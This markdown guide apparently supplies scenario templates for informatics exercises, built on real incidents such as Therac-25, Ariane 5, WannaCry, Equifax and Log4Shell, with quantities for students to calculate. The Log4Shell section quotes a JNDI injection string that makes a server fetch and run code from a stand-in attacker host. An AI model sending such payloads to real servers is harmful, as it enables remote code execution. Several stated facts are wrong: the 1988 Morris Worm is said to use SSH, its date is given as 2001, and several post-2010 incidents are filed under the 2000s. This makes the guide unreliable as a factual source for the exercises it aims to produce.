# 💻 INFORMATICS - SCENARIO PATTERNS & CONTEXTS

## 🎯 WHERE COMPUTER SCIENCE DISASTERS AND TRIUMPHS HAPPEN

Fresh, diverse scenario patterns for authentic informatics tasks based on **15 real incidents**.

**REMEMBER THE 80/20 RULE**: Use fresh, unexpected scenarios 80% of the time.

---

## 🌟 15 SCENARIO ARCHETYPES FOR INFORMATICS TASKS

Each archetype represents authentic incidents where informatics knowledge is critical.

---

### 1. ⚡ THERAC-25 / RACE CONDITION & SOFTWARE SAFETY

**Professional Context**: Software engineer investigating fatal medical device software bug

**Specific Scenario Examples:**

**Therac-25 Radiation Overdose Deaths (East Texas Cancer Center, June 1985)**

- Computer-controlled radiation therapy machine
- Race condition bug: Operator types too fast → software can't keep up
- Safety check skipped, but power settings change!
- Normal dose: 1 gray (1 J/kg tissue)
- Bug causes: 200 gray overdose
- Six incidents, three deaths
- Operator input: ~100 characters at 0.1 s/character
- Race condition window: ~8 seconds
- Calculate: Timing analysis, energy calculations (200 gray = ? joules/kg)
- Real tragedy: First documented deaths from software bug

**Boeing 737 MAX MCAS Software (Lion Air 610, October 2018)**

- Automated flight control system (MCAS)
- Single sensor failure → repeated nose-down commands
- Pilots fighting software, 189 deaths
- Software design flaw: Trusted single sensor, no redundancy
- Calculate: Response time requirements, sensor reliability

**Toyota Unintended Acceleration (2000s-2010)**

- Electronic throttle control software
- Stack overflow in real-time OS
- Vehicles accelerating uncontrollably
- Multiple deaths, massive recall
- Software analysis: Memory corruption, task scheduling bugs

---

### 2. 🚀 ARIANE 5 / INTEGER OVERFLOW

**Professional Context**: Aerospace software developer analyzing rocket explosion

**Specific Scenario Examples:**

**Ariane 5 Flight 501 Explosion (Kourou, French Guiana, June 4, 1996)**

- 37 seconds into flight, $7 billion rocket explodes
- Inertial Reference System converting 64-bit float → 16-bit signed integer
- Horizontal velocity exceeds 16-bit max (32,767)
- Overflow exception → computer freeze → self-destruct
- Backup system: Same code → also froze
- Velocity value: 500,000 units
- Calculate: Max 16-bit signed int? By what % does 500,000 exceed?
- Code reuse failure: Ariane 4 code didn't anticipate Ariane 5 speed
- Most expensive software bug in history

**Mars Climate Orbiter Loss (September 23, 1999)**

- $327.6 million spacecraft disintegrated in Mars atmosphere
- Software error: One team used imperial units, another metric
- Thruster force: Pound-force vs. Newtons
- Calculate: Unit conversion error magnitude
- Communication failure between engineering teams

**Patriot Missile Failure (Dhahran, Saudi Arabia, February 25, 1991)**

- Scud missile interceptor software
- Floating-point rounding error in time calculation
- 100 hours uptime → 0.34 second clock drift
- Missed incoming Scud, 28 US soldiers killed
- Calculate: Accumulated rounding error over time

---

### 3. 🐛 MORRIS WORM / EXPONENTIAL SPREAD & NETWORK PROPAGATION

**Professional Context**: System administrator combating first internet worm

**Specific Scenario Examples:**

**Morris Worm (Cornell University, November 2, 1988)**

- First major internet worm, ~6,000 machines infected
- Exploits: SSH weak passwords, sendmail buffer overflow, finger daemon
- Replication bug: Copies with 1/7 probability even if already present
- Multiple copies → machine overload
- Connects to 100 machines, spreads in 10 seconds each
- Calculate: Time to infect 10,000 machines with exponential growth
- 5 copies running: Probability ≥1 more gets in? [1 - (6/7)⁵]
- Creator Robert Morris: First person convicted under Computer Fraud Act

**Code Red Worm (July 2001)**

- Exploited Microsoft IIS buffer overflow
- 359,000 hosts infected in 14 hours
- White House website DDoS
- Calculate: Infection rate, exponential growth modeling

**SQL Slammer Worm (January 25, 2003)**

- Fastest spreading worm: 75,000 hosts in 10 minutes
- Doubled every 8.5 seconds initially
- Internet traffic degraded globally
- Calculate: Exponential doubling, saturation point

---

### 4. 🔓 EQUIFAX / DATA BREACH & VULNERABILITY MANAGEMENT

**Professional Context**: Security engineer investigating massive data breach

**Specific Scenario Examples:**

**Equifax Data Breach (May-July 2017, Atlanta, USA)**

- 147 million Americans' personal data stolen
- Apache Struts vulnerability (CVE-2017-5638)
- Patch available March, breach occurred May-July (unpatched!)
- Command injection in Content-Type header
- Each record ~2 KB
- Calculate: Total data volume (GB/TB)?
- Download at 10 Mbit/s: How long to exfiltrate?
- Over 120 days: Average daily theft?
- Massive financial/reputational damage

**Marriott/Starwood Breach (2014-2018)**

- 500 million guest records
- 4 years undetected
- Passport numbers, credit cards, personal info
- Calculate: Data volume, detection gap

**Capital One Breach (July 2019)**

- 100 million credit card applications
- AWS S3 bucket misconfiguration
- SSRF (Server-Side Request Forgery) exploit
- Calculate: Cloud storage costs, data exposure

---

### 5. 🔒 WANNACRY / RANSOMWARE & EXPONENTIAL INFECTION

**Professional Context**: Hospital IT director managing ransomware outbreak

**Specific Scenario Examples:**

**WannaCry Global Ransomware (May 12, 2017, NHS London)**

- 230,000 machines infected in 150 countries in 4 days
- EternalBlue exploit (NSA tool, stolen and leaked)
- SMBv1 vulnerability, buffer overflow → remote code execution
- AES-128 encryption of all files
- Hospitals paralyzed: Patient records, surgery notes encrypted
- $300 Bitcoin ransom
- Calculate: Infection rate per hour? (230,000 ÷ 96 hours)
- Each machine attacks 50 others/min, 10% success: New infections/hour?
- Exponential growth model: N(t) = N₀ × e^(rt)
- Kill switch discovery: Accidental domain registration stopped spread

**NotPetya (June 27, 2017)**

- Ukraine tax software supply chain attack
- Spread globally, $10 billion damage
- Maersk shipping company paralyzed
- Calculate: Economic impact, infection spread

**Ryuk Ransomware (2018-present)**

- Targeted attacks on hospitals, municipalities
- Average ransom: $1-3 million
- Manual deployment, highly sophisticated
- Calculate: ROI for attackers, victim decision analysis

---

### 6. 📊 FACEBOOK-CAMBRIDGE ANALYTICA / DATA PRIVACY & GRAPH APIs

**Professional Context**: Data analyst investigating unauthorized data harvesting

**Specific Scenario Examples:**

**Cambridge Analytica Scandal (March 2018, Facebook HQ)**

- 87 million users' data harvested without consent
- Professor Kogan's app: 270,000 users installed "thisisyourdigitallife"
- Facebook Graph API v1.0: Gave app users' AND friends' data
- Average 340 friends per person
- Calculate: 270,000 × 340 = ? (but overlaps!)
- Actual unique: 87 million (overlap adjustment)
- % decrease from raw calculation?
- Each profile 1 MB: Total TB?
- Political manipulation: Brexit, Trump 2016
- Psychological profiling, micro-targeted ads

**Google Street View WiFi Data Collection (2010)**

- Street View cars collected WiFi payload data
- Passwords, emails captured unintentionally
- Privacy violations across 30+ countries
- Calculate: Data volume, legal penalties

**TikTok Data Collection Concerns (2020-2024)**

- Clipboard data access, keystroke logging allegations
- 1 billion+ users globally
- Geopolitical concerns (China)
- Calculate: Potential data exposure scale

---

### 7. 💸 KNIGHT CAPITAL / ALGORITHMIC TRADING DISASTER

**Professional Context**: Trader analyzing high-frequency trading catastrophe

**Specific Scenario Examples:**

**Knight Capital Flash Crash (August 1, 2012, 9:30 AM, NYSE)**

- 45 minutes: 4 million trades, $440 million loss
- Power Peg algorithm deployment error
- 8 servers: Updated 7, forgot server #8
- Old test code on server #8: Buy high, sell low repeatedly
- Automated, faster than human comprehension
- Calculate: Trades/second? (4M ÷ 2,700 seconds)
- Average loss/trade? ($440M ÷ 4M)
- Revenue lost? (Daily usual $100M, lost $440M = ? days)
- Near bankruptcy from single deployment error

**Flash Crash (May 6, 2010)**

- Dow Jones dropped 1,000 points in minutes
- $1 trillion market value vanished temporarily
- Algorithmic trading feedback loops
- Calculate: Price velocity, market recovery time

**Robinhood GameStop Trading Halt (January 2021)**

- Retail investors vs. hedge funds
- Trading restricted due to collateral requirements
- Calculate: Volume surge, margin requirements

---

### 8. ⚙️ STUXNET / CYBERWEAPON & INDUSTRIAL SABOTAGE

**Professional Context**: Security analyst examining nation-state cyberweapon

**Specific Scenario Examples:**

**Stuxnet Iran Nuclear Sabotage (Natanz, June 2010)**

- ~1,000 uranium enrichment centrifuges destroyed
- 15,000 lines of C code, 10+ programmers
- US-Israeli operation (allegedly)
- Spreads via USB, exploits 4 Windows zero-days
- Targets Siemens SCADA systems
- Manipulates PLC (Programmable Logic Controller)
- Normal centrifuge speed: 1,064 Hz
- Stuxnet: Accelerates to 1,410 Hz, then slows to 2 Hz
- Machines self-destruct, but monitors show "normal"
- Calculate: 1,064 Hz = ? RPM
- 1,410 Hz = ?% faster than normal
- 2 Hz = ?% slower than normal
- Each centrifuge $100K: Total damage?
- First malware causing physical destruction

**BlackEnergy Ukraine Power Grid (December 2015)**

- 230,000 people without power
- SCADA attack, circuit breakers opened remotely
- Calculate: Power restoration timeline

**Triton/Trisis Malware (Saudi Arabia, 2017)**

- Targeted safety instrumented systems (SIS)
- Could have caused explosion at petrochemical plant
- Calculate: Industrial safety system redundancy

---

### 9. 🗂️ YAHOO / MASSIVE DATA BREACH SCALE

**Professional Context**: Forensic analyst investigating multi-year breach

**Specific Scenario Examples:**

**Yahoo Mega Breach (2013, discovered 2016, Sunnyvale, USA)**

- 3 BILLION accounts compromised (every Yahoo account ever!)
- 2014 breach: 500 million
- 2013 breach: 3 billion
- Undetected for 3 years!
- Spear phishing → credential theft → lateral movement → full database
- Names, emails, phones, birth dates, MD5 password hashes
- State-sponsored attackers (allegedly)
- Calculate: 3B accounts × 1 KB = ? TB and PB
- Download at 100 Mbit/s = ? time
- 1B active users 2016: 3B breach = ?% (includes inactive accounts)
- Largest breach in history (at the time)

**Adobe Breach (October 2013)**

- 153 million user records
- Encrypted passwords, but encryption key also stolen
- Source code leaked
- Calculate: Data volume, password cracking time

**LinkedIn Breach (2012, discovered 2016)**

- 165 million accounts
- Passwords SHA-1 hashed (no salt)
- Easy to crack
- Calculate: Hash cracking rate

---

### 10. 🚗 UBER SELF-DRIVING CAR / MACHINE LEARNING FAILURE

**Professional Context**: NTSB software auditor investigating fatal autonomous crash

**Specific Scenario Examples:**

**Uber ATG Fatal Crash (Tempe, Arizona, March 18, 2018, night)**

- Elaine Herzberg, 49, killed crossing street with bicycle
- Volvo XC90: 6 LIDAR, 10 radar, 7 cameras
- Detected pedestrian >5 seconds before collision
- Classification kept changing: "Unknown" → "Vehicle" → "Bicycle" → "Unknown"
- Software RESET trajectory prediction with each classification change!
- Emergency braking disabled (too many false positives)
- Backup driver watching video on phone
- Speed: 43 mph (19 m/s)
- Calculate: Detection distance (19 m/s × 5 s = ?)
- Braking distance with 0.6g deceleration (6 m/s²)?
- Could have stopped? (Yes! 30 m needed < 95 m available)
- Decision window: Milliseconds when braking still effective
- Preventable death from software + human failure

**Tesla Autopilot Crashes (Multiple incidents)**

- Misclassification of stationary objects
- Over-reliance on driver monitoring
- Calculate: Sensor fusion failure modes

**Waymo/Cruise Incidents (San Francisco, 2023)**

- Blocking traffic, interfering with emergency vehicles
- Calculate: Incident rate vs. human drivers

---

### 11. 🌐 SOLARWINDS / SUPPLY CHAIN ATTACK

**Professional Context**: Threat intelligence analyst investigating supply chain compromise

**Specific Scenario Examples:**

**SolarWinds Orion Backdoor (December 2020, FireEye discovery)**

- 33,000 companies use SolarWinds Orion
- Russian APT29/Cozy Bear compromised build system
- SUNBURST malware inserted into source code
- Digitally signed by SolarWinds (trusted!)
- 18,000 customers downloaded infected update (March-June 2020)
- ~10% actively exploited = 1,800 companies
- Microsoft, Cisco, Intel, Fortune 500, US government
- Backdoor dormant 2 weeks, then C&C via DNS
- Calculate: 18,000 × 0.10 = ? attacked
- Average 100 GB stolen per company = ? TB total
- APT team ~50 hackers: Companies per hacker?
- Months undetected, massive national security breach

**CCleaner Backdoor (September 2017)**

- 2.27 million users downloaded trojanized version
- Legitimate software update mechanism compromised
- Calculate: Infection scale, detection timeline

**Kaseya VSA Ransomware (July 2021)**

- MSP software compromised
- 1,500 businesses affected via supply chain
- Calculate: Cascade effect, downstream victims

---

### 12. 🌊 GITHUB DDOS / AMPLIFICATION ATTACK

**Professional Context**: Network engineer defending against record DDoS

**Specific Scenario Examples:**

**GitHub DDoS Attack (February 28, 2018, 13:21 UTC)**

- 1.35 terabits/second - largest DDoS in history (at the time)
- Memcached amplification attack
- Memcached servers: UDP port 11211, many open/unsecured
- Attacker sends 15-byte request with IP spoofing (source = GitHub)
- Memcached responds with 750 KB to GitHub!
- Amplification factor: 50,000×
- ~50,000 Memcached servers participated
- 8 minutes peak duration
- GitHub unavailable globally
- Akamai DDoS mitigation helped filter
- Calculate: 1.35 Tbit/s ÷ 8 bits/byte = ? GB/s
- 8 minutes (480 s) = ? total data (PB)
- 50,000 servers: Average Mbit/s per server?
- Amplification: 750 KB ÷ 15 bytes = ?×

**Dyn DNS DDoS (October 21, 2016)**

- Mirai botnet, IoT devices
- Twitter, Netflix, Reddit unavailable
- Calculate: Botnet size, traffic volume

**AWS DDoS (February 2020)**

- 2.3 Tbps attack
- CLDAP reflection
- Calculate: Amplification factor, mitigation cost

---

### 13. 🛒 TARGET / RETAIL POS MALWARE BREACH

**Professional Context**: PCI compliance auditor investigating retail breach

**Specific Scenario Examples:**

**Target Credit Card Breach (November-December 2013, pre-Christmas)**

- 40 million credit card records
- 70 million personal information records
- Hackers attacked HVAC supplier Fazio Mechanical Services first
- Phishing email → credentials
- Fazio had VPN access to Target (for HVAC monitoring)
- Lateral movement to POS (Point of Sale) terminals
- RAM scraping malware: Reads card data BEFORE encryption
- Track 1 and Track 2 magnetic stripe data
- Exfiltration to external servers
- 19 days undetected
- Calculate: Each card track ~80 bytes, 40M cards = ? GB
- Over 19 days: Cards/minute average?
- 1,800 stores: Cards per store average?
- Holiday shopping season disaster

**Home Depot Breach (April-September 2014)**

- 56 million payment cards
- Third-party vendor credentials
- Calculate: Scale comparison with Target

**Neiman Marcus Breach (July 2013-January 2014)**

- 350,000 payment cards
- Undetected for 6 months
- Calculate: Detection delay impact

---

### 14. 🔍 SLACK ELDORADO BUG / API VULNERABILITY

**Professional Context**: Bug bounty hunter discovering critical information leak

**Specific Scenario Examples:**

**Slack Search API Bug (March 2017)**

- Bug bounty hunter testing Slack search
- Added parameter: `include_archived: true`
- Result: ALL public channels' archived messages accessible!
- Not just own workspace - EVERY Slack workspace globally!
- Search "password" → tens of thousands of results
- Different companies' passwords, API keys, AWS credentials, secrets
- "Eldorado bug" - CRITICAL severity
- Reported responsibly, fixed in 24 hours
- Reward: $3,000
- Calculate: 10M workspaces × 100 public channels = ? total channels
- Each channel 10K archived messages = ? total messages
- 1% contain sensitive data = ? sensitive items at risk
- Real vulnerability: Massive information disclosure potential

**GitHub OAuth Token Leak (April 2022)**

- OAuth tokens exposed in logs
- Access to private repositories
- Calculate: Affected repositories, token rotation timeline

**Okta Breach (January 2022)**

- Authentication provider compromised
- 366 customers potentially affected
- Calculate: Cascade effect through SSO

---

### 15. 🪵 LOG4SHELL / ZERO-DAY VULNERABILITY

**Professional Context**: Security engineer responding to critical widespread vulnerability

**Specific Scenario Examples:**

**Log4Shell (CVE-2021-44228, December 9, 2021, Minecraft discovery)**

- Most popular Java logging library (Log4j)
- Used EVERYWHERE: Minecraft, Apache, Tesla, Twitter, Amazon, Apple iCloud, Steam
- JNDI injection: `${jndi:ldap://attacker.com/a}` in logged string
- Log4j initiates LDAP lookup, downloads Java class, EXECUTES
- Remote Code Execution (RCE)
- CVSS 10.0 - CRITICAL (maximum severity)
- Next 72 hours: Global chaos
- Millions patching, hackers exploiting, automated scanning
- ~3 million Java servers use Log4j
- Calculate: Only 30% patch in 24h = ? vulnerable remain
- Hackers scan 1,000 servers/hour: How long to check all?
- 10% exploitable: Potential victims in 72h?
- Critical infrastructure at risk globally

**Heartbleed (April 2014)**

- OpenSSL vulnerability
- 17% of secure web servers vulnerable
- Memory leak exposing encryption keys
- Calculate: Affected servers, rekey timeline

**Shellshock (September 2014)**

- Bash shell vulnerability
- Millions of devices affected
- Calculate: Patch deployment urgency, risk window

---

## 🚫 AVOID THESE CLICHÉS

### Generic Abstract CS:

- ❌ "Sort an array of numbers"
- ❌ "Build a simple calculator"
- ❌ "Create a login form"
- ❌ "Implement binary search"

### Vague Scenarios:

- ❌ "A company has a security issue"
- ❌ "Someone wrote buggy code"
- ❌ "Data needs processing"

**Instead: Be SPECIFIC**

- ✅ "Therac-25 race condition, June 1985, 3 deaths"
- ✅ "Ariane 5 integer overflow, June 4, 1996, $7B loss"
- ✅ "WannaCry ransomware, May 12, 2017, 230K machines"
- ✅ "Log4Shell zero-day, December 9, 2021, CVSS 10.0"

---

## 🎯 SCENARIO SELECTION STRATEGY

### Step 1: Identify CS Topic

- **Algorithms** → Morris Worm exponential spread, GitHub DDoS amplification
- **Data Structures** → Facebook Graph API, Slack search vulnerability
- **Security** → Equifax breach, WannaCry, SolarWinds, Log4Shell
- **Systems** → Therac-25 race condition, Stuxnet SCADA attack
- **Software Engineering** → Ariane 5 overflow, Knight Capital deployment
- **Machine Learning** → Uber self-driving classification failure

### Step 2: Match to Real Incident

Choose incident that authentically requires the CS concept.

### Step 3: Add Specific Details

- **Real dates**: June 4, 1996, 9:30 AM (not "one day")
- **Real locations**: Kourou, French Guiana (not "somewhere")
- **Real people/companies**: Robert Morris, Knight Capital, Elaine Herzberg
- **Real data**: 147 million records, $440M loss, 1.35 Tbit/s

### Step 4: Verify CS Realism

- Real vulnerability or bug
- Actual systems involved
- Calculations match professional analysis
- Outcome matches historical record

---

## 🌏 GEOGRAPHIC & TEMPORAL DIVERSITY

### 1980s (Early Computing Era):

- Morris Worm (1988)
- Therac-25 (1985)

### 1990s (Internet Growth):

- Ariane 5 (1996)

### 2000s (Web 2.0):

- Morris Worm (2001)
- SQL Slammer (2003)
- Knight Capital (2012)
- Target breach (2013)
- Yahoo breach (2013)
- Heartbleed (2014)
- Shellshock (2014)

### 2010s (Cloud & Mobile):

- Equifax (2017)
- WannaCry (2017)
- Uber crash (2018)
- GitHub DDoS (2018)
- Facebook-Cambridge Analytica (2018)

### 2020s (Modern Era):

- SolarWinds (2020)
- Log4Shell (2021)

---

## 📌 REMEMBER

**Real Incidents > Generic Problems**
**Specific Dates > Vague Timeframes**
**Life-Critical Stakes > Academic Exercises**

Choose contexts showing informatics in ACTUAL disasters, breaches, and failures.

**Every informatics task should make students think:**

> "This is how race conditions killed people / integer overflows destroyed rockets / vulnerabilities exposed millions!"

**Not:**

> "Here's another abstract sorting problem..."

---

## 🎨 CREATIVITY PRINCIPLE

**These 15 incidents are EXAMPLES, not limits.**

Use them as inspiration to create NEW scenarios following the same principles:

- ✅ Real incidents or contemporary issues
- ✅ Professional roles (engineer, analyst, auditor, researcher)
- ✅ Specific data (dates, CVE numbers, breach sizes, financial losses)
- ✅ Life-critical or financially significant outcomes
- ✅ Accurate CS applications

**80/20 Rule**: 80% creative new scenarios inspired by incidents, 20% direct incident use.
